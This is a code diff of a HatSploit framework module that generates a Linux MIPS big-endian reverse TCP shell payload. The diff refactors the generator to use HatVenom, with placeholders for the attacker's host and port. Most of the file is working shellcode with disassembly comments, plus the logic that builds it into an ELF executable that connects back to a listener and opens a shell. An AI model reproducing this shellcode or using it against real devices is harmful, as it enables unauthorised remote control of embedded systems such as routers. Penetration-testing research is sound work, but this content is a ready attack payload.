@@ -25,11 +25,11 @@
 #
 
 from core.lib.payload import Payload
-from utils.payload.payload import PayloadGenerator
+from utils.hatvenom.hatvenom import HatVenom
 from utils.tcp.tcp import TCPClient
 
 
-class HatSploitPayload(Payload, PayloadGenerator, TCPClient):
+class HatSploitPayload(Payload, HatVenom, TCPClient):
     details = {
         'Category': "stager",
         'Name': "Linux mipsbe Shell Reverse TCP",
@@ -62,24 +62,17 @@ class HatSploitPayload(Payload, PayloadGenerator, TCPClient):
             'Value': 8888,
             'Type': "port",
             'Required': True
-        },
-        'FORMAT': {
-            'Description': "Executable format.",
-            'Value': "elf",
-            'Type': None,
-            'Required': True
         }
     }
 
     def run(self):
-        local_host, local_port, executable_format = self.parse_options(self.options)
+        local_host, local_port = self.parse_options(self.options)
 
-        local_host = self.host_to_bytes(local_host)
-        local_port = self.port_to_bytes(local_port)
-
-        if executable_format not in self.formats.keys():
-            self.output_error("Invalid executable format!")
-            return
+        offsets = {
+            'lport': local_port,
+            'lhost1': self.ip_bytes(local_host)[:2],
+            'lhost2': self.ip_bytes(local_host)[2:]
+        }
 
         self.output_process("Generating shellcode...")
         shellcode = (
@@ -105,10 +98,10 @@ class HatSploitPayload(Payload, PayloadGenerator, TCPClient):
             b"\x24\x02\x0f\xc9"  # li       v0,4041
             b"\x01\x09\x09\x0c"  # syscall  0x42424
             b"\x3c\x05\x00\x02"  # lui      a1,0x2
-            b"\x34\xa5" + local_port +  # "\x7a\x69"  # ori   a1,a1,0x7a69
+            b"\x34\xa5:lport:port:"  # "\x7a\x69"  # ori   a1,a1,0x7a69
             b"\xaf\xa5\xff\xf8"  # sw       a1,-8(sp)
-            b"\x3c\x05" + local_host[:2] +  # "\xc0\xa8"  # lui   a1,0xc0a8
-            b"\x34\xa5" + local_host[2:] +  # "\x01\x37"  # ori   a1,a1,0x137
+            b"\x3c\x05:lhost1:"  # "\xc0\xa8"  # lui   a1,0xc0a8
+            b"\x34\xa5:lhost2:"  # "\x01\x37"  # ori   a1,a1,0x137
             b"\xaf\xa5\xff\xfc"  # sw       a1,-4(sp)
             b"\x23\xa5\xff\xf8"  # addi     a1,sp,-8
             b"\x24\x0c\xff\xef"  # li       t4,-17
@@ -135,6 +128,6 @@ class HatSploitPayload(Payload, PayloadGenerator, TCPClient):
         )
 
         self.output_process("Generating payload...")
-        payload = self.generate(executable_format, 'mipsbe', shellcode)
+        payload = self.generate('elf', 'mipsbe', shellcode, offsets)
 
         return payload
